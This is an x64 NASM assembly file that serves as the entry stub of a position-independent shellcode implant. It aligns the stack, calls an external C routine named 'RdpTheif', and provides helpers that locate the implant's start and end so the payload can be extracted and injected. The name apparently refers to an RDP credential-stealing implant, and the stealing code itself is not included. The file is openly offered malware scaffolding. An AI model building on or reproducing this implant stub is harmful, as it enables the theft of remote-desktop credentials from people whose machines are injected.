[BITS 64]
DEFAULT REL

extern RdpTheif

GLOBAL alignstack
GLOBAL StRipStart
GLOBAL StRipEnd
GLOBAL ___chkstk_ms

[SECTION .text$A]
    alignstack:
        push rdi                    ; backup rdi since we will be using this as our main register
        mov rdi, rsp                ; save stack pointer to rdi
        and rsp, byte -0x10         ; align stack with 16 bytes
        sub rsp, byte +0x20         ; allocate some space for our C function
        call RdpTheif               ; call the C function
        mov rsp, rdi                ; restore stack pointer
        pop rdi                     ; restore rdi
        ret                         ; return where we left
    StRipStart:
            call StRipPtrStart
            ret
    StRipPtrStart:
        mov	rax, [rsp] ;; get the return address
        sub rax, 0x1b  ;; subtract the instructions size to get the base address
        ret            ;; return to StRipStart

[SECTION .text$B]
    ___chkstk_ms:
    ret

[SECTION .text$E]
    ;;
    ;; get end of the implant
    ;;
    StRipEnd:
        call StRetPtrEnd
        ret
    ;;
    ;; get the return address of StRipEnd and put it into the rax register
    ;;
    StRetPtrEnd:
        mov rax, [rsp] ;; get the return address
        add	rax, 0xb   ;; get implant end address
        ret            ;; return to StRipEnd


[SECTION .text$P]
    SymTheEndOfCode:
        db 'E', 'N', 'D', '-', 'O', 'F', '-', 'C', 'O', 'D', 'E'
